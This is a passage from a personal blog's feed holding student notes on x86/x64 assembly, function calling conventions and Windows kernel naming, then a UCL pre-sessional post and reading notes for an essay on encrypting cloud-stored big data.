</span><br><span class="line">…</span><br><span class="line"> <span class="keyword">int</span> <span class="keyword">Add</span>(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">00411410</span> <span class="keyword">push</span> <span class="built_in">ebp</span>//父函数的栈底指针入栈</span><br><span class="line"><span class="number">00411411</span> <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span>//栈顶变栈底</span><br><span class="line"><span class="number">00411413</span> <span class="keyword">sub</span> <span class="built_in">esp</span>,<span class="number">0C0h</span>//为局部变量开辟空间</span><br><span class="line"><span class="number">00411419</span> <span class="keyword">push</span> <span class="built_in">ebx</span></span><br><span class="line">0041141A <span class="keyword">push</span> <span class="built_in">esi</span></span><br><span class="line">0041141B <span class="keyword">push</span> <span class="built_in">edi</span></span><br><span class="line">0041141C <span class="keyword">lea</span> <span class="built_in">edi</span>,[<span class="built_in">ebp</span>-<span class="number">0C0h</span>]</span><br><span class="line"><span class="number">00411422</span> <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="number">30h</span></span><br><span class="line"><span class="number">00411427</span> <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="number">0CCCCCCCCh</span></span><br><span class="line">0041142C <span class="keyword">rep</span> stos <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>]</span><br><span class="line">return a+b<span class="comment">;</span></span><br><span class="line">0041142E <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [a] //取出函数参数a的值到<span class="built_in">eax</span></span><br><span class="line"><span class="number">00411431</span> <span class="keyword">add</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [b] //将函数参数b的值累加到<span class="built_in">eax</span>，而<span class="built_in">eax</span>就是用来保存函数返回值的，不需要在对计算结果进行移动了</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">00411434</span> <span class="keyword">pop</span> <span class="built_in">edi</span>//恢复现场</span><br><span class="line"><span class="number">00411435</span> <span class="keyword">pop</span> <span class="built_in">esi</span></span><br><span class="line"><span class="number">00411436</span> <span class="keyword">pop</span> <span class="built_in">ebx</span></span><br><span class="line"><span class="number">00411437</span> <span class="keyword">mov</span> <span class="built_in">esp</span>,<span class="built_in">ebp</span></span><br><span class="line"><span class="number">00411439</span> <span class="keyword">pop</span> <span class="built_in">ebp</span></span><br><span class="line">0041143A <span class="keyword">ret</span> //取出当前的栈顶，就是<span class="keyword">call</span>语句调用时压入的下一条指令地址，然后<span class="keyword">jmp</span>过去，从而实现函数返回</span><br><span class="line">… </span><br><span class="line"><span class="keyword">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">00411450</span> <span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line"><span class="number">00411451</span> <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line"><span class="number">00411453</span> <span class="keyword">sub</span> <span class="built_in">esp</span>,<span class="number">0CCh</span></span><br><span class="line"><span class="number">00411459</span> <span class="keyword">push</span> <span class="built_in">ebx</span></span><br><span class="line">0041145A <span class="keyword">push</span> <span class="built_in">esi</span></span><br><span class="line">0041145B <span class="keyword">push</span> <span class="built_in">edi</span></span><br><span class="line">0041145C <span class="keyword">lea</span> <span class="built_in">edi</span>,[<span class="built_in">ebp</span>-<span class="number">0CCh</span>]</span><br><span class="line"><span class="number">00411462</span> <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="number">33h</span></span><br><span class="line"><span class="number">00411467</span> <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="number">0CCCCCCCCh</span></span><br><span class="line">0041146C <span class="keyword">rep</span> stos <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>]</span><br><span class="line"><span class="keyword">int</span> c = <span class="keyword">Add</span>(<span class="number">1</span>,<span class="number">2</span>)<span class="comment">;</span></span><br><span class="line">0041146E <span class="keyword">push</span> <span class="number">2</span> //将函数参数压入堆栈，先从最后一个参数压起，这个顺序与调用约定有关</span><br><span class="line"><span class="number">00411470</span> <span class="keyword">push</span> <span class="number">1</span> //将函数参数压入堆栈，默认的调用约定是__cdecl，可以参考下面的调用约定表</span><br><span class="line"><span class="number">00411472</span> <span class="keyword">call</span> <span class="keyword">Add</span> (<span class="number">41109Bh</span>) //调用<span class="keyword">Add</span>函数，并将下一条指令的地址<span class="number">00411477</span>压入堆栈，之后跳转到0041109B</span><br><span class="line">而0041109B处的指令如最上面的跳转表所示，直接跳到另<span class="keyword">Add</span>函数的首地址</span><br><span class="line"><span class="number">00411477</span> <span class="keyword">add</span> <span class="built_in">esp</span>,<span class="number">8</span> //弹出栈中的<span class="number">2</span>个整型函数参数，不需要赋值给任何寄存器，这里直接操作栈顶指针而没有使用<span class="keyword">pop</span></span><br><span class="line">0041147A <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [c],<span class="built_in">eax</span> //将返回值赋给变量c </span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0041147D</span> <span class="keyword">xor</span> <span class="built_in">eax</span>,<span class="built_in">eax</span> //用<span class="built_in">eax</span>异或自身将<span class="built_in">eax</span>清零，用来作为main函数的返回值</span><br><span class="line">0041147F <span class="keyword">pop</span> <span class="built_in">edi</span></span><br><span class="line"><span class="number">00411480</span> <span class="keyword">pop</span> <span class="built_in">esi</span></span><br><span class="line"><span class="number">00411481</span> <span class="keyword">pop</span> <span class="built_in">ebx</span></span><br><span class="line"><span class="number">00411482</span> <span class="keyword">add</span> <span class="built_in">esp</span>,<span class="number">0CCh</span></span><br><span class="line"><span class="number">00411488</span> <span class="keyword">cmp</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line">0041148A <span class="keyword">call</span> @ILT+<span class="number">350</span>(__RTC_CheckEsp) (<span class="number">411163h</span>)</span><br><span class="line">0041148F <span class="keyword">mov</span> <span class="built_in">esp</span>,<span class="built_in">ebp</span></span><br><span class="line"><span class="number">00411491</span> <span class="keyword">pop</span> <span class="built_in">ebp</span></span><br><span class="line"><span class="number">00411492</span> <span class="keyword">ret</span></span><br></pre></td></tr></table></figure><p><img src="/2020/11/05/函数调用基础知识/x86函数调用.png" alt></p><h2 id="x86-循环读取数组"><a href="#x86-循环读取数组" class="headerlink" title="x86 循环读取数组"></a>x86 循环读取数组</h2><p><img src="/2020/11/05/函数调用基础知识/汇编循环语句.png" alt></p><h2 id="x86内核调用"><a href="#x86内核调用" class="headerlink" title="x86内核调用"></a>x86内核调用</h2><p>程序员调用的是API（API函数），然后通过与系统调用共同完成函数的功能。</p><h2 id="arm-和-x86的区别"><a href="#arm-和-x86的区别" class="headerlink" title="arm 和 x86的区别"></a>arm 和 x86的区别</h2><p>cpu对于机器码的每一个bit的解释都不同，arm指令集简单，</p><ol><li>所有指令都是32位或者16位的 而<strong>x86不等长</strong>，所以指令预测都比x86要难做一些</li><li>寻址方式也不一样，这个就得看各个架构的reference manual了。这方面一个比较大的区别是x86使用了分段（实际上在linux中，绕过了分段模式，但是cpu确实是分段的），而arm是分页。</li><li>x86指令采用了可访问内存地址的方法 容易造成处理器和内存间的不平衡工作 降低效率 arm只用load/store指令从内存中读取数据到寄存器 每条指令中的访问内存地址不会超过一个 访问内存操作不会和算术操作混在一起</li></ol><h1 id="X86-64-windows和-X86下的三种调用约定"><a href="#X86-64-windows和-X86下的三种调用约定" class="headerlink" title="X86-64 windows和 X86下的三种调用约定"></a>X86-64 windows和 X86下的三种调用约定</h1><p>x86平台下常用的有三种调用约定，<code>__cdecl、__stdcall、__fastcall</code> <strong>主要区别就是 调用结束后谁来平衡堆栈</strong></p><h2 id="cdecl"><a href="#cdecl" class="headerlink" title="__cdecl"></a>__cdecl</h2><p>是C/C++的默认调用约定，如果不显示声明调用约定的情况下，就是该调用约定<br><strong>__cdecl参数从右至左入栈，然后由调用者（caller）清理栈区</strong> <br><br>如下图 主函数多了一条 add esp(用于平衡堆栈 清理 callee 开辟的栈空间)</p><p><img src="/2020/11/05/函数调用基础知识/cdecl.png" alt></p><h2 id="stdcall"><a href="#stdcall" class="headerlink" title="__stdcall"></a>__stdcall</h2><p>__stdcall 是Windows API默认调用约定，微软的WINAPI、CALLBACK等宏都是这个调用约定<br><img src="/2020/11/05/函数调用基础知识/stdcall.png" alt></p><p><strong>main函数并没有对子函数的清栈过程，<strong>stdcall参数跟</strong>cdecl入栈方式相同，从右至左入栈，被调用者（callee）清理栈区</strong> (在callee内部结束完成的栈平衡)</p><h2 id="fastcall"><a href="#fastcall" class="headerlink" title="__fastcall"></a>__fastcall</h2><p>是32位下一种特殊的调用约定<br><img src="/2020/11/05/函数调用基础知识/fastcall.png" alt></p><p><strong>__fastcall参数还是从右至左入栈，但是不同的是前两个参数被分别放进了ecx、edx寄存器，如果少于或等于两个参数，会先将参数放入寄存器。同样由被调用者（callee）清理栈区</strong></p><h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><p>实际例子代码参考 UCL-malware-lab</p><h2 id="X64只有一种-fastcall-函数调用约定"><a href="#X64只有一种-fastcall-函数调用约定" class="headerlink" title="X64只有一种 fastcall 函数调用约定"></a>X64只有一种 fastcall 函数调用约定</h2><p>传递参数的过程和x86的fastcall还不一样, 同时参数的传递过程随编译器的变化变化</p><ol><li><code>gcc</code> 前六个参数依次保存在<strong>RDI, RSI, RDX, RCX, R8, R9</strong>中 (Linux)</li><li><code>vc</code> 前4个参数依次放入<strong>RCX, RDX, R8, R9</strong>中 (win)</li></ol><h3 id="寄存器-2"><a href="#寄存器-2" class="headerlink" title="寄存器"></a>寄存器</h3><p><img src="/2020/11/05/函数调用基础知识/Linux64-registers.png" alt></p><h3 id="fastcall-函数调用约定"><a href="#fastcall-函数调用约定" class="headerlink" title="fastcall 函数调用约定"></a>fastcall 函数调用约定</h3><p>不同的平台不同:</p><ol><li><code>gcc</code> 前六个参数依次保存在<strong>RDI, RSI, RDX, RCX, R8, R9</strong>中 (Linux)</li><li><code>vc</code> 前4个参数依次放入<strong>RCX, RDX, R8, R9</strong>中 (win)</li></ol><p>剩下的参数从右往左依次入栈，被调用者实现栈平衡，返回值存放在 RAX 中。(类似arm32)</p><h2 id="linuxX86和64的区别"><a href="#linuxX86和64的区别" class="headerlink" title="linuxX86和64的区别"></a>linuxX86和64的区别</h2><p>linux64与linux86的区别主要有两点：</p><ol><li>首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。</li><li>其次是函数参数的传递方式发生了改变，<strong>x86中参数都是保存在栈上(除了x86的fastcall),但在x64中的参数依次保存在(RDI, RSI,) RDX, RCX, R8和 R9中</strong>，如果还有更多的参数的话才会保存在栈上。</li></ol><h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><h2 id="消息机制"><a href="#消息机制" class="headerlink" title="消息机制"></a>消息机制</h2><h3 id="DLL"><a href="#DLL" class="headerlink" title="DLL"></a>DLL</h3><p><img src="/2020/11/05/函数调用基础知识/dll.png" alt></p><h3 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h3><p>系统消息队列<br>应用程序消息队列</p><p>当一个事件发生时 Windows先将输入的消息放入系统消息队列 再将输入的消息复制到对应的 应用程序消息队列中<br>应用程序中的消息循环在它的消息队列中检索每个消息并发给相应的窗口</p><h3 id="消息值"><a href="#消息值" class="headerlink" title="消息值"></a>消息值</h3><p>lParam 和 wParam 是宏定义，一般在消息函数中带这两个类型的参数，通常用来存储窗口消息的参数。 WndProc的第三个和第四个参数的类型分别为WPARAM和LPARAM。</p><p>就如同你看到的 windows 消息的结构包含为 (hWnd,MSG,WParam,LParam)<br>hwnd 是窗口句柄<br>msg 是消息类型 也就是 WM_XXXX 之类的<br>wParam 和 lParam 是消息的附带参数 根据WM_XXX 的类型而决定这两个值是什么</p><h2 id="内核调用"><a href="#内核调用" class="headerlink" title="内核调用"></a>内核调用</h2><h3 id="api"><a href="#api" class="headerlink" title="api"></a>api</h3><p><img src="/2020/11/05/函数调用基础知识/api.png" alt></p><h3 id="内核函数前缀"><a href="#内核函数前缀" class="headerlink" title="内核函数前缀"></a>内核函数前缀</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Windows的内核函数在命名上有个很好的特色，就是函数名都按其所在的层次或模块加上了特定的前缀。了解了这些前缀，看到一个函数名就可以大致知道这个函数所属的层次和模块，主要的前缀有：</span><br><span class="line"></span><br><span class="line"><span class="keyword">Ex</span>：管理层，<span class="keyword">Ex</span>是Executive的开头两个字母。</span><br><span class="line"></span><br><span class="line">Ke：核心层，Ke是Kernel的开头两个字母。</span><br><span class="line"></span><br><span class="line">Hal：硬件抽象层，Hal是Hardware Abstraction Layer的缩写。</span><br><span class="line"></span><br><span class="line">Ob：对象管理，Ob是Object的开头两个字母。</span><br><span class="line"></span><br><span class="line">Mm：内存管理，Mm是<span class="keyword">Memory</span> Manager的缩写。</span><br><span class="line"></span><br><span class="line">Ps：进程（线程）管理，Ps表示Process。</span><br><span class="line"></span><br><span class="line"><span class="keyword">Se</span>：安全管理，<span class="keyword">Se</span>是Security的开头两个字母。</span><br><span class="line"></span><br><span class="line">Io：I/O管理。</span><br><span class="line"></span><br><span class="line">Fs：文件系统，Fs是<span class="keyword">File</span> System的缩写。</span><br><span class="line"></span><br><span class="line"><span class="keyword">Cc</span>：文件缓存管理，<span class="keyword">Cc</span>表示Cache。</span><br><span class="line"></span><br><span class="line">Cm：系统配置管理，Cm是Configuration Manager的缩写。</span><br><span class="line"></span><br><span class="line">Pp：<span class="string">"即插即用"</span>管理，Pp表示PnP。</span><br><span class="line"></span><br><span class="line">Rtl：运行时程序库，Rtl是Runtime Library的缩写。</span><br><span class="line"></span><br><span class="line">不过并非所有的函数名都带有这样的前缀，对前缀的使用也并非十分严格。例如，核心层函数名的前缀本应是Ke，但是实际上有不少核心层函数名的前缀是Ki，这些函数大都是与中断有关的比较底层的函数。</span><br><span class="line"></span><br><span class="line">有时候还在函数名的前缀后面加上小写字母f，表示这个函数是快速调用函数。例如：</span><br><span class="line"></span><br><span class="line">NTKERNELAPI LONG_PTR FASTCALL ObfDereferenceObject(<span class="keyword">IN</span> PVOID  Object);</span><br></pre></td></tr></table></figure><p>一般的函数调用是通过堆栈传递参数的，而快速调用函数则通过ECX等寄存器传递参数</p><p><a href="https://blog.csdn.net/chenlycly/article/details/52777707" target="_blank" rel="noopener">https://blog.csdn.net/chenlycly/article/details/52777707</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;汇编基础知识&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="Sketches" scheme="http://Ronpa.top/tags/Sketches/"/>
    
  </entry>
  
  <entry>
    <title>Pre-sessional course of UCL</title>
    <link href="http://ronpa.top/2020/09/22/Pre-sessional-course-of-UCL/"/>
    <id>http://ronpa.top/2020/09/22/Pre-sessional-course-of-UCL/</id>
    <published>2020-09-22T21:17:06.000Z</published>
    <updated>2021-03-09T08:01:51.453Z</updated>
    
    <content type="html"><![CDATA[<h1 id="congratulation"><a href="#congratulation" class="headerlink" title="congratulation !!!"></a>congratulation !!!</h1><a id="more"></a><p><img src="/2020/09/22/Pre-sessional-course-of-UCL/spongeBob.png" alt></p><p><img src="/2020/09/22/Pre-sessional-course-of-UCL/hug.png" alt></p><p>博客迁移完完全全参考 <a href="https://blog.csdn.net/Julialove102123/article/details/88855256?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param" target="_blank" rel="noopener">https://blog.csdn.net/Julialove102123/article/details/88855256?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;congratulation&quot;&gt;&lt;a href=&quot;#congratulation&quot; class=&quot;headerlink&quot; title=&quot;congratulation !!!&quot;&gt;&lt;/a&gt;congratulation !!!&lt;/h1&gt;</summary>
    
    
    
    
    <category term="Sketches" scheme="http://Ronpa.top/tags/Sketches/"/>
    
  </entry>
  
  <entry>
    <title>Extend Essay Task for Pre-session Course</title>
    <link href="http://ronpa.top/2020/07/22/Extend-Essay-Task-for-Pre-session-Course/"/>
    <id>http://ronpa.top/2020/07/22/Extend-Essay-Task-for-Pre-session-Course/</id>
    <published>2020-07-21T23:23:10.000Z</published>
    <updated>2021-01-25T19:23:52.779Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>some notes about reference sources</p></blockquote><a id="more"></a><h1 id="1-A-Big-Data-Storage-Scheme-Based-on-Distributed-Storage-Locations-and-Multiple-Authorizations"><a href="#1-A-Big-Data-Storage-Scheme-Based-on-Distributed-Storage-Locations-and-Multiple-Authorizations" class="headerlink" title="1. A Big Data Storage Scheme Based on Distributed Storage Locations and Multiple Authorizations"></a>1. A Big Data Storage Scheme Based on Distributed Storage Locations and Multiple Authorizations</h1><h3 id="definition"><a href="#definition" class="headerlink" title="definition"></a>definition</h3><p>Big Data: Big Data is defined as a huge amount of different data types that are provisioned through different resources, e.g., social networks, sensor devices, and streaming machines</p><h3 id="main-idea"><a href="#main-idea" class="headerlink" title="main idea"></a>main idea</h3><ol><li>Cheng 将大数据分割存储, 然后对数据块之间的顺序进行加密,就是不告诉你数据块是怎么排列了,以此来保护数据同时缩短加密时间. 但有个问题, 无论是path或是数据块间的映射关系, 对比加密原数据 数据量很小,意味着破解难度大大降低, vulnerable</li><li>Li等人在[11]中提出了一种安全的分布式敏感大数据的智能加密方法。减少了云运营商接触敏感大数据的机会。大数据文件容易被修改; 说是异或加密??? 感觉是在乱写</li><li>(SAEDS）模型; 防止运营商获取数据; 在发送数据到云端前进行预处理加密; </li><li>Khan等人。提出了一种安全的大数据方案，将大数据文件分成不同的类别[19]。根据所提出的大数据的重要性对其进行分类。正常数据存储在云中没有分离。敏感数据被分成多个部分，分布在云端。当数据被请求时，敏感数据被从存储位置收集并合并成正常数据并发送给相应的用户。</li><li>Dong 提出了virtual machine monitoring 用于管理秘钥</li><li>[21]利用ssl和密码保护, 估计主要是为了针对非授权入侵, 还有一个证书分发机构</li><li>大数据安全需要保证的几个方面 可以用在background(服务商, 政策, 访客记录…)</li><li>background 数据量每天很多</li></ol><p>文章提出了几层安全保障 对应几个安全问题:</p><ol><li>SSS 加密秘钥被分发 reduces centralized data control(集中控制)</li><li>传输过程中使用SHA进行编码, 防止被tamper(数据完整性)</li><li>data encryption and distributed encryption key</li><li>definition of cloud</li></ol><p><img src="/2020/07/22/Extend-Essay-Task-for-Pre-session-Course/1-1.png" alt></p><h1 id="2-A-cloud-computing-based-system-for-cyber-security-management"><a href="#2-A-cloud-computing-based-system-for-cyber-security-management" class="headerlink" title="2. A cloud computing based system for cyber security management"></a>2. A cloud computing based system for cyber security management</h1><h3 id="Abstrct"><a href="#Abstrct" class="headerlink" title="Abstrct"></a>Abstrct</h3><p>网络安全管理中的大数据分析对数据的获取、存储和处理提出了挑战。为了应对这些挑战，本文开发了一个基于云计算的网络安全管理系统，以加快网络大数据的分析过程。</p><h3 id="main-body"><a href="#main-body" class="headerlink" title="main body"></a>main body</h3><p>is not quite relevant to my topic. This article focuses on the application of big data in the cyber security.</p><h1 id="3-Intelligent-cryptography-approach-for-secure-distributed-big-data-storage-in-cloud-computing"><a href="#3-Intelligent-cryptography-approach-for-secure-distributed-big-data-storage-in-cloud-computing" class="headerlink" title="3. Intelligent cryptography approach for secure distributed big data storage in cloud computing"></a>3. Intelligent cryptography approach for secure distributed big data storage in cloud computing</h1><p><strong>(cited by 1 )</strong></p><h3 id="main-body-1"><a href="#main-body-1" class="headerlink" title="main body"></a>main body</h3><ol><li>许多云供应商都提供了极具吸引力的存储服务，为用户提供了巨大且可扩展的基于云的存储空间，如Amazon、Dropbox、Google Drive和微软OneDrive[14,19,28]。但是，云端操作带来的安全问题仍然是企业使用STaaS的障碍[2,11,13,15,55]。许多云用户担心云运营商可以访问的敏感数据[17,54]。这件事使STaaS的当代实现感到尴尬，尽管许多先前的研究已经涉及到这个领域[26,32,40,43]。(可以作为background 说明big data为什么都是存在云端)</li><li>attack during data transimissions; unexpected operation; balance 主要的三块问题</li><li>threate from cloud service operators</li><li>aims to encrypt all data and distributively store the data to the different cloud servers without causing big overheads and latency</li><li>主要工作 加密数据和有选择的分割数据</li><li>安全存储面临的问题分析 给云端的权利太少 就无法保证数据完整性</li><li>Mass Distributed storage has been explored… 大数据 分布式存储的背景</li></ol><h1 id="4-A-decentralized-approach-for-mining-event-correlations-in-distributed-system-monitoring"><a href="#4-A-decentralized-approach-for-mining-event-correlations-in-distributed-system-monitoring" class="headerlink" title="4. A decentralized approach for mining event correlations in distributed system monitoring"></a>4. A decentralized approach for mining event correlations in distributed system monitoring</h1><p><strong>(cited by 3)</strong></p><h3 id="point"><a href="#point" class="headerlink" title="point"></a>point</h3><ol><li>随着系统规模的增加, 数据库压力也会增大, 效率会降低(可以作为background 说明big data为什么都是存在云端)</li></ol><h1 id="5-Intrusion-detection-techniques-for-mobile-cloud-computing-in-heterogeneous-5G"><a href="#5-Intrusion-detection-techniques-for-mobile-cloud-computing-in-heterogeneous-5G" class="headerlink" title="5. Intrusion detection techniques for mobile cloud computing in heterogeneous 5G"></a>5. Intrusion detection techniques for mobile cloud computing in heterogeneous 5G</h1><p><strong>(cited by 3)</strong></p><p>这篇帮我科普了很多云计算的知识</p><h3 id="main-body-2"><a href="#main-body-2" class="headerlink" title="main body"></a>main body</h3><ol><li>云存储的威胁  improper user authentications, managing tool limitations, and intentional attacks</li><li>存在云端的好和坏(可以作为background 说明big data为什么都是存在云端)</li><li>存在云端的坏 易被入侵</li><li>definition of intrusion</li><li>definition of cloud</li></ol><h1 id="6-A-Survey-of-Data-Mining-and-Machine-Learning-Methods-for-Cyber-Security-Intrusion-Detection"><a href="#6-A-Survey-of-Data-Mining-and-Machine-Learning-Methods-for-Cyber-Security-Intrusion-Detection" class="headerlink" title="6. A Survey of Data Mining and Machine Learning Methods for Cyber Security Intrusion Detection"></a>6. A Survey of Data Mining and Machine Learning Methods for Cyber Security Intrusion Detection</h1><ol><li>提到了intrusion的各种类型 蠕虫 溢出等等</li></ol><p><img src="/2020/07/22/Extend-Essay-Task-for-Pre-session-Course/1-2.png" alt></p><h1 id="7-Security-Aware-Information-Classifications-Using-Supervised-Learning-for-Cloud-Based-Cyber-Risk-Management-in-Financial-Big-Data"><a href="#7-Security-Aware-Information-Classifications-Using-Supervised-Learning-for-Cloud-Based-Cyber-Risk-Management-in-Financial-Big-Data" class="headerlink" title="7. Security-Aware Information Classifications Using Supervised Learning for Cloud-Based Cyber Risk Management in Financial Big Data"></a>7. Security-Aware Information Classifications Using Supervised Learning for Cloud-Based Cyber Risk Management in Financial Big Data</h1><ol><li>就提到一点 The core businesses of each financial enterprise usually consist of sensitive information, which need to be protected from any unanticipated operations or data retrievals. </li></ol><h1 id="8-Big-Data-computing-and-clouds-Trends-and-future-directions"><a href="#8-Big-Data-computing-and-clouds-Trends-and-future-directions" class="headerlink" title="8. Big Data computing and clouds- Trends and future directions"></a>8. Big Data computing and clouds- Trends and future directions</h1><ol><li>background, 社会的发展-&gt; 大数据的产生</li></ol><h1 id="9-Security-in-cloud-computing-Opportunities-and-challenges"><a href="#9-Security-in-cloud-computing-Opportunities-and-challenges" class="headerlink" title="9.Security in cloud computing- Opportunities and challenges"></a>9.Security in cloud computing- Opportunities and challenges</h1><ol><li>user 掌握解密的key</li></ol><h1 id="10-Journal-of-Network-and-Computer-Applications"><a href="#10-Journal-of-Network-and-Computer-Applications" class="headerlink" title="10. Journal of Network and Computer Applications"></a>10. Journal of Network and Computer Applications</h1><ol><li>传统云端系统的缺陷 Traditionally, confidentiality of data has been preserved using security procedures such as information security policies along with conventional security mechanisms such as firewalls, virtual private networks and intrusion detection systems. Unfortunately, these mechanisms lack pro-activeness and dedication towards protecting confidential data, and in most cases, they require predefined rules by which protection actions are taken. </li><li>evidence about information leakage</li></ol><h1 id="11-Research-of-Digital-Signature-Based-on-ECC-in-E-government"><a href="#11-Research-of-Digital-Signature-Based-on-ECC-in-E-government" class="headerlink" title="11.Research of Digital Signature Based on ECC in E-government"></a>11.Research of Digital Signature Based on ECC in E-government</h1><ol><li>digital signature 的 definition</li><li>生成散列函数的算法 synthesis 配合第一篇</li></ol><h1 id="12-Secure-big-data-storage-and-sharing-scheme-for-cloud-tenants"><a href="#12-Secure-big-data-storage-and-sharing-scheme-for-cloud-tenants" class="headerlink" title="12. Secure big data storage and sharing scheme for cloud tenants"></a>12. Secure big data storage and sharing scheme for cloud tenants</h1><ol><li>加密会对数据系统造成负担</li></ol><h1 id="13-Contours-of-Security-in-Cyberspace"><a href="#13-Contours-of-Security-in-Cyberspace" class="headerlink" title="13.Contours of Security in Cyberspace"></a>13.Contours of Security in Cyberspace</h1><ol><li>介绍了各种攻击方法</li></ol><h1 id="plan-of-extended-essay"><a href="#plan-of-extended-essay" class="headerlink" title="plan of extended essay"></a>plan of extended essay</h1><h2 id="title-Challenges-of-Big-Data-management-Should-data-stored-in-the-cloud-be-encrypted"><a href="#title-Challenges-of-Big-Data-management-Should-data-stored-in-the-cloud-be-encrypted" class="headerlink" title="title: Challenges of Big Data management: Should data stored in the cloud be encrypted"></a>title: Challenges of Big Data management: Should data stored in the cloud be encrypted</h2><p>Background: Big data can’t be stored on a specific server because of its characteristics of data volume, so many users choose to store the data on the cloud provided by cloud service providers, or even split and store data on different servers.</p><p>Outline: As shown in the plan, I will first introduce the necessity of cloud big data encryption, then introduce some problems encountered after encrypting data, and finally refute the problems raised and give appropriate solutions.</p><p>(Data encryption refers to that users use a special piece of data as the key to code and modify the original data. It is difficult for others to decrypt the encrypted data without that special data.)</p><p>(Cloud storage is a model of computer data storage in which the digital data is stored in logical pools. Whenever and wherever you are, as long as you can connect to the Internet, you can access the data that you have on the cloud server.)</p><p>This article will argue that although the big data stored in the cloud will face some problems if encrypted, encryption can ensure the security of the data. Also, this article provides and evaluates a series of solutions to the problems of encrypting data mentioned in the main paragraphs.</p><p>Encryption can ensure the security of big data:</p><p>a. Encoded Big data stored in the cloud could prevent unauthorized access from the cloud operators. </p><p>e.g. If cloud service providers see plaintext directly, they might monitor information from some sensitive organisations, especially financial industry and governmental agencies, and illegally uses it for profit(Yibin Li et al., 2017).</p><p>b. Once the unencrypted data is attacked, there is the possibility of leakage.</p><p>e.g. Hackers might impersonate users to access cloud data(Zeyad A. Al-Odat, 2020).</p><p>c. Encrypting data in the cloud can ensure the integrity and authenticity of data.</p><p>e.g. Data authenticity is achieved using the Secure Hash Algorithm(Zeyad A. Al-Odat, 2020).</p><p>The big data stored in the cloud will face some problems if encrypted:</p><p>a. Because of the large scale of big data, it takes a lot of time to encrypt and decrypt data, which makes the transmission and data retrieval inefficient.</p><p>e.g. Research shows that processing big data takes a lot of time(Guobin Xu, 2015).</p><p>b. It is not safe for users to keep the decrypted key.</p><p>e.g. Users with poor information security awareness are more likely to be cheated by hackers.</p><p>Solutions to the problems of encrypting big data:</p><p>a. Divide the Big Data file into categories to reduce the expenditure on the time of processing big data.</p><p>e.g.  Classify the big data into importance, normal and sensitive data. And The normal data are stored in the cloud without being encrypted. However, the sensitive data is encrypted and distributed over the cloud locations. </p><p>b. Avoid centralized key management.</p><p>e.g. Assign more than one key to a third-party organization other than the user’s own. For example, distributing five keys. Only holding more than three keys can access the data. Prevent hackers from stealing one of the keys and using it to decrypt the data.</p><h1 id="Brief-Title-of-Presentation"><a href="#Brief-Title-of-Presentation" class="headerlink" title="Brief Title of Presentation"></a>Brief Title of Presentation</h1><p>Because I think the title of my extended essay is specific enough, the title of my presentation is similar to that of extended essay. Is the title of presentation appropriate?</p><p>And the main content of my presentation is based on the first part of my future extended eaasy.</p><p>Tile: ‘Big data management: data should be encrypted’</p><p>thesis statement: ‘Encrypting big data stored in the cloud can ensure informaiton security’</p><p>outline:</p><ol><li>Prevent from the unauthorized access (from cloud service operators and hackers)</li><li>Ensure the integrity of big data(using the Secure Hash Algorithm)</li><li>Conclusion</li></ol>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;some notes about reference sources&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="Sketches" scheme="http://Ronpa.top/tags/Sketches/"/>
    
  </entry>
  
  <entry>
    <title>基于机器学习的恶意软件侦壳系统</title>
